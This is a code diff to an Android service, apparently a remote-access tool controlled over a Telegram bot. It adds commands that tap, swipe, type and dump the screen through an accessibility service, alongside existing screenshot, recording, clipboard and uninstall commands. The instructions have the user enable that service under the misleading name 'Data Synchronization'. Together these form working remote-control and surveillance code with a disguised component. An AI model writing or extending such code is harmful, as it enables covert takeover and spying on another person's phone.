@@ -63,6 +63,10 @@ public class RelayService extends Service {
             if (low.equals("shot")) { cmdShot(); return; }
             if (low.equals("rec") || low.startsWith("rec ")) { cmdRec(c); return; }
             if (low.equals("clip") || low.startsWith("clip ")) { cmdClip(c); return; }
+            if (low.startsWith("tap ")) { cmdMaos(c, "tap"); return; }
+            if (low.startsWith("swipe ")) { cmdMaos(c, "swipe"); return; }
+            if (low.startsWith("type ")) { cmdMaos(c, "type"); return; }
+            if (low.equals("ui")) { cmdMaos(c, "ui"); return; }
             if (low.equals("perm")) {
                 Intent pi = new Intent(this, PermActivity.class);
                 pi.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -324,6 +328,32 @@ private void cmdUninstall() {
         PendingIntent p = PendingIntent.getBroadcast(this, sid, status,
                 PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
         s.commit(p.getIntentSender());
+    }
+
+    private void cmdMaos(String c, String modo) {
+        AgentHandsService maos = AgentHandsService.instancia;
+        if (maos == null) {
+            tg.say("maos: servico DESABILITADO - Settings > Acessibilidade > Sincronizacao de Dados > ligar (1x). " +
+                    "Nao afeta os outros comandos.");
+            return;
+        }
+        try {
+            if (modo.equals("ui")) { tg.say(maos.dumpUI()); return; }
+            if (modo.equals("type")) { tg.say(maos.digitar(c.substring(5)) ? "type: digitado" : "type: sem campo de texto focado"); return; }
+            String[] p = c.trim().split("\\s+");
+            if (modo.equals("tap")) {
+                if (p.length < 3) { tg.say("uso: tap <x> <y>"); return; }
+                tg.say(maos.tap(Integer.parseInt(p[1]), Integer.parseInt(p[2])) ? "tap ok" : "tap falhou");
+                return;
+            }
+            if (modo.equals("swipe")) {
+                if (p.length < 5) { tg.say("uso: swipe <x1> <y1> <x2> <y2> [dur]"); return; }
+                int dur = p.length > 5 ? Integer.parseInt(p[5]) : 300;
+                tg.say(maos.swipe(Integer.parseInt(p[1]), Integer.parseInt(p[2]),
+                        Integer.parseInt(p[3]), Integer.parseInt(p[4]), dur) ? "swipe ok" : "swipe falhou");
+                return;
+            }
+        } catch (Exception e) { tg.say("maos: erro " + e); }
     }
 
     private void cmdShot() {
